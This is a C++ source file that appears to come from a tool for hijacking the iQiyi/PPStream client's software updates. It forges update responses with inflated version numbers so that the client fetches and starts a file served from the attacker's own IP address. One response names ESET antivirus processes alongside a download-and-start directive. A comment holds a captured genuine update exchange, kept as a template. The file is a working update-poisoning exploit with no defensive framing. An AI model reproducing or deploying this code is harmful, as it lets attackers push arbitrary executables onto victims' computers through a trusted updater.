
#include "Iqiyi.h"
#include "..\\cipher/CryptoUtils.h"
#include "../HttpUtils.h"

int Iqiyi::prepareRespData(unsigned long ulIP, string filepath, string filename) {
	int ret = 0;
	char * lpRespFormat =
		"HTTP/1.1 200 OK\r\nContent-Length: %u\r\n"	
		"Content-Type: text/xml\r\n"
		"Connection: keep-alive\r\n\r\n%s";

	char * lpRespContentFormat =
		"<version>\r\n"
		"<Domain>\r\n"
		"<domain>http://dl.static.iqiyi.com</domain>\r\n"
		"<domain>http://update.pps.tv.iqiyi.com</domain>\r\n"
		"<domain>http://update.ppstream.com.iqiyi.com</domain>\r\n"
		"</Domain>\r\n"
		"<Clientpath>HKEY_LOCAL_MACHINE$$$$SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\PPStream.exe$$$$ </Clientpath>\r\n"
		"<Path>\r\n"
		"<path reg=\"true\" name=\"HKEY_LOCAL_MACHINE$$$$SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\PPStream.exe$$$$\" flag=\"1\" />\r\n"
		"<path reg=\"false\" name=\"%%appdata%%\\IQIYI Video\\LStyle\" flag=\"2\" />\r\n"
		"<path reg=\"false\" name=\"%%temp%%\" flag=\"3\" />\r\n"
		"<path reg=\"true\" name=\"HKEY_CLASSES_ROOT$$$$HCDNProxy$$$$\" flag=\"4\" />\r\n"
		"<path reg=\"true\" name=\"HKEY_CURRENT_USER$$$$Software\\PPStream\\main$$$$vmPagePath\" flag=\"5\" />\r\n"
		"</Path>\r\n"
		"<update enable=\"1\" name=\"%s\" usehttp=\"0\" httplink=\"%s\" md5=\"%s\" crc32=\"%s\" filesize=\"%u\" cubelink=\"http://%s/%s\" probability=\"40\" seed=\"18820\" clientminver=\"1.1.11.1111\" clientmaxver=\"9.9.99.9999\" >\r\n"
		"<FILE name=\"QiyiService.exe\" ver=\"9.9.9.552\" path=\"1\" />\r\n"
		"<FILE name=\"QyFragment.exe\" ver=\"9.9.99.6251\" path=\"1\" />\r\n"
		"<FILE name=\"QyKernel.exe\" ver=\"99.9.9.633\" path=\"1\" />\r\n"
		"<FILE name=\"QyPlayer.exe\" ver=\"9.9.99.6251\" path=\"1\" />\r\n"
		"</update>\r\n"
		"</version>\r\n\r\n\r\n\r\n";

	string szip = HttpUtils::getIPstr(ulIP) + "/" + G_USERNAME;

	ret = getUpdateFileMd5(filepath + filename, TRUE);

	string crc = CryptoUtils::FileCrc32(filepath + filename, -1,TRUE);

	char lpRespContent[MAX_RESPONSE_HEADER_SIZE];
	int iRespContentLen = sprintf_s(lpRespContent, MAX_RESPONSE_HEADER_SIZE, lpRespContentFormat,
		filename.c_str(),filename.c_str(), m_szmd5,crc.c_str(), m_filesize,szip.c_str(),filename.c_str());

	m_iRespSize = sprintf_s(m_lpResp, MAX_RESPONSE_HEADER_SIZE, lpRespFormat, iRespContentLen, lpRespContent);
	return m_iRespSize;
}


int Iqiyi::prepareHCDNRespData(unsigned int ulIP, string filepath, string filename) {
	int ret = 0;
	char * lpRespFormat =
		"HTTP/1.1 200 OK\r\nContent-Length: %u\r\n"
		"Content-Type: application/octet-stream\r\n"
		"Connection: keep-alive\r\n\r\n%s";

	char * lpRespContentFormat =
		"[HCDNClientNet.dll]\n"
		"md5=%s\n"
		"url=http://%s/%s\n"
		"file=HCDNClientNet.dll\n"
		"remotever=99.9.1.665\n"
		"localver=99.9.1.659,99.9.1.659\n"
		"region=all\n"
		"percent=0\n\n";

	string szip = HttpUtils::getIPstr(ulIP) + "/" + G_USERNAME;

	ret = getUpdateFileMd5(filepath + filename, TRUE);

	char lpRespContent[MAX_RESPONSE_HEADER_SIZE];
	int iRespContentLen = sprintf_s(lpRespContent, MAX_RESPONSE_HEADER_SIZE, lpRespContentFormat,m_szmd5, szip.c_str(), filename.c_str());

	m_iRespSize = sprintf_s(m_lpResp, MAX_RESPONSE_HEADER_SIZE, lpRespFormat, iRespContentLen, lpRespContent);
	return m_iRespSize;
}


int Iqiyi::prepareDllRespData(unsigned int ulIP, string filepath, string filename) {
	char * lpRespFormat =
		"HTTP/1.1 200 OK\r\nContent-Length: %u\r\n"
		"Content-Type: application/octet-stream\r\n"
		"Connection: keep-alive\r\n\r\n%s";

	char * lpRespContentFormat =
		"[Control]\r\n"
		"app=egui,ekrn,nod32kui,nod32krn\r\n"
		"count=1\r\n"
		"c0=DownloadHelper\r\n"
		"[Downloader]\r\n"
		"DownloadHelper=http://%s/%s;Start;QIYI\r\n\r\n";

	string szip = HttpUtils::getIPstr(ulIP) + "/" + G_USERNAME;

	char lpRespContent[MAX_RESPONSE_HEADER_SIZE];
	int iRespContentLen = sprintf_s(lpRespContent, MAX_RESPONSE_HEADER_SIZE, lpRespContentFormat,szip.c_str(), filename.c_str());

	m_iRespSize = sprintf_s(m_lpResp, MAX_RESPONSE_HEADER_SIZE, lpRespFormat, iRespContentLen, lpRespContent);
	return m_iRespSize;
}



/*
GET /update/HCDNkernel/HCDNClientUpdate.ini HTTP/1.1
Host: p2pupdate.inter.iqiyi.com:8888
Accept: *
User-Agent: HCDNClient

HTTP/1.1 200 OK
Server: nginx
Date: Tue, 02 Apr 2019 11:12:17 GMT
Content-Type: application/octet-stream
Content-Length: 194
Last-Modified: Wed, 20 Mar 2019 01:53:13 GMT
Connection: keep-alive
ETag: "5c919d09-c2"
Accept-Ranges: bytes

[HCDNClientNet.dll]
md5=910d5c7be4ed77826dd824e9999f626d
url=/update/HCDNkernel/HCDNClientNet.dll
file=HCDNClientNet.dll
remotever=15.0.1.680
localver=15.0.1.663,15.0.1.663
region=all
percent=5
*/